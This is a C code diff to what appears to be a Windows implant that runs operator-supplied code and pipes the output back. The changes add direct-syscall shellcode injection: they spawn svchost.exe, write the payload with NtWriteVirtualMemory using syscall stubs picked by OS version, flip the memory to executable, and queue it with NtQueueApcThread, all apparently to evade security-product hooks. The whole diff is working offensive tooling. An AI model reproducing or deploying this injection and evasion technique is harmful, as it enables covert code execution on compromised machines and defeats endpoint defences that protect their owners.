@@ -2,6 +2,7 @@
 
 // kinda important 
 
+#include <ntdef.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <lmcons.h>
@@ -9,12 +10,15 @@
 #include <winbase.h>
 #include <wtsapi32.h>
 #include <tlhelp32.h>
+#include <winternl.h>
+#include <versionhelpers.h>
 #include <processthreadsapi.h>
 
 // our local stuff
 
-#include "settings.h"
 #include "loader.h"
+#include "settings.h"
+#include "syscalls.h"
 
 #define MAX_OUTPUT 1000
 #define IDLE_KILL_TIME 60
@@ -69,8 +73,8 @@ BOOL InjectModule(CHAR* Bytes, DWORD Size)
 
     printf("Injecting into pid: %d\n", GetProcessId(hProcess));
 
-    rBuffer = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(hProcess, rBuffer, Bytes, Size, NULL);
+    // rBuffer = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    // WriteProcessMemory(hProcess, rBuffer, Bytes, Size, NULL);
 
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
 
@@ -155,15 +159,18 @@ void ProcessWatch(HANDLE pHandle)
     
 }
 
-BOOL InjectUserCode(CHAR* Bytes, DWORD Size)
+BOOL InjectUserCode(CHAR* Bytes, SIZE_T Size)
 {
     /*
     Run user supplied code and send all the output back to them
     */
-
+    
     DWORD threadId;
     HANDLE tHandle;
     HANDLE hProcess;
+    ULONG oProc, nProc;
+
+    LPVOID rBuffer = NULL;
 
     HANDLE g_hChildStd_IN_Rd = NULL;
     HANDLE g_hChildStd_IN_Wr = NULL;
@@ -175,7 +182,14 @@ BOOL InjectUserCode(CHAR* Bytes, DWORD Size)
     // Set the bInheritHandle flag so pipe handles are inherited. 
     saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
     saAttr.bInheritHandle = TRUE; 
-    saAttr.lpSecurityDescriptor = NULL; 
+    saAttr.lpSecurityDescriptor = NULL;
+
+    // need these so we can use the correct syscalls
+    OSVERSIONINFOEXW osInfo;
+	osInfo.dwOSVersionInfoSize = sizeof(osInfo);
+
+    // resolve so we can use this later to identify what syscall we need
+    RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");
 
     // create a pipe to get the stdout 
     if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
@@ -217,22 +231,39 @@ BOOL InjectUserCode(CHAR* Bytes, DWORD Size)
     sInfo.hStdInput = g_hChildStd_IN_Rd;
     sInfo.dwFlags |= STARTF_USESTDHANDLES;
 
+    // get the os info so we can use the correct syscall number
+    RtlGetVersion(&osInfo);
+
     // start the thread to read from the stdout pipe
     CreateThread(NULL, 0, ReadFromPipe, g_hChildStd_OUT_Rd, 0, &threadId);
 
     // spawn svchost.exe with a different ppid an jus start it running
     CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo);
 
-    // alloc and write the code to the process
-    PVOID rBuffer = VirtualAllocEx(pInfo.hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(pInfo.hProcess, rBuffer, Bytes, Size, NULL);
+    // alloc the memory we need inside the process
+    rBuffer = VirtualAllocEx(pInfo.hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
     
+    // make sure we are using the correct syscall numbers, probly a nicer way of doing this
+    if ((osInfo.dwMajorVersion) == 10 && (osInfo.dwMinorVersion == 0))
+    {
+        NtQueueApcThread     = &NtQueueApcThread10;
+        NtWriteVirtualMemory = &NtWriteVirtualMemory10;
+    } else if ((osInfo.dwMajorVersion) == 6 && (osInfo.dwMinorVersion == 3))
+    {
+        NtQueueApcThread     = &NtQueueApcThread81;
+        NtWriteVirtualMemory = &NtWriteVirtualMemory81;
+    }
+
+    // write our shellcode bytes to the process
+    NtWriteVirtualMemory(pInfo.hProcess, rBuffer, Bytes, Size, NULL);
+
+    // change the permisions on the memory so we can execute it
+    VirtualProtectEx(pInfo.hProcess, rBuffer, Size, PAGE_EXECUTE_READWRITE, &oProc);
+
     // execute the code inside the process
-    QueueUserAPC((PAPCFUNC)rBuffer, pInfo.hThread, NULL);
+    NtQueueApcThread(pInfo.hThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
 
-    // start the process cleanup thread
-    // CreateThread(NULL, 0, ProcessWatch, pInfo.hProcess, 0, &threadId);
-
+    // clean up a bit
     ZeroMemory(Bytes, Size);
 
     return;
